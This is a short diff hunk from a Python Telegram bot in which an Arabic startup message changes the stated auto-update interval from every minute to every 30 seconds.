@@ -1208,7 +1378,7 @@ def main():
     print("✨ ميزة الإرسال الفوري مفعلة")
     print("🎯 واجهة الأزرار جاهزة")
     print("📊 عرض الإحصائيات المتقدم مفعل")
-    print("⏱️ التحديث التلقائي كل دقيقة مفعل")
+    print("⏱️ التحديث التلقائي كل 30 ثانية مفعل")
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
